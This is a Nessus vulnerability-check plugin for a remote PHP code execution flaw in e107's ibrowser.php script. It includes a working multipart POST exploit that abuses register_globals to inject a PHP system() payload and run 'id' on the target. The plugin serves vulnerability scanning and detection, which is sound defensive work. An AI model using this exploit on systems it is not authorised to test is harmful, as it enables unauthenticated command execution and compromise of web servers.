#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that allows execution of
arbitrary PHP code. 

Description :

The 'e107_handlers/tiny_mce/plugins/ibrowser/ibrowser.php' script
included with the version of e107 installed on the remote host
contains a programming flaw that may allow an unauthenticated remote
attacker to execute arbitrary PHP code on the affected host, subject
to the privileges of the web server user id. 

Note that successful exploitation of this issue requires that PHP's
'register_globals' and 'file_uploads' settings be enabled and that the
remote version of PHP be older than 4.4.1 or 5.0.6. 

See also :

http://www.hardened-php.net/globals-problem
http://www.hardened-php.net/hphp/zend_hash_del_key_or_index_vulnerability.html
http://milw0rm.com/exploits/2268

Solution :

Upgrade to PHP version 4.4.3 / 5.1.4 or later. 

Risk factor :

Medium / CVSS Base Score : 4.8
(AV:L/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(22299);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-3390", "CVE-2006-3017");
  script_bugtraq_id(15250, 17843);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"25255");
  }

  script_name(english:"e107 Remote Code Execution Vulnerability");
  script_summary(english:"Tries to run a command in e107");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("e107_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/e107"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the affected script exists.
  url = string(dir, "/e107_handlers/tiny_mce/plugins/ibrowser/ibrowser.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ("alert(tinyMCE.getLang" >< res)
  {
    # Try to exploit the flaw to execute a command.
    #
    # nb: as part of the attack, a scratch file is written on the target; but
    #     PHP removes the file when the request is finished since the target
    #     script doesn't do anything with the upload.
    cmd = "id";
    boundary = "bound";
    req = string(	
      "POST ",  url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
      # nb: we'll add the Content-Length header and post data later.
    );
    boundary = string("--", boundary);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="GLOBALS"; filename="nessus";', "\r\n",
      "Content-Type: image/jpeg;\r\n",
      "\r\n",
      SCRIPT_NAME, "\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="tinyMCE_imglib_include"; filename="nessus";', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      '# nb: only run cmd if the request is from the nessusd host.\r\n',
      '<? if ($REMOTE_ADDR == "', this_host(), '") { system(', cmd, "); } ?>\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="-1203709508"; filename="nessus";', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      "1\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="225672436"; filename="nessus";', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      "1\r\n",

      boundary, "--", "\r\n"
    );
    req = string(
      req,
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
    if (line)
    {
      if (report_verbosity < 1) report = desc;
      else report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus was able to execute the command 'id' on the remote host,\n",
        "which produced the following output :\n",
        "\n",
        line
      );
      security_warning(port:port, data:report);
      exit(0);
    }
  }
}
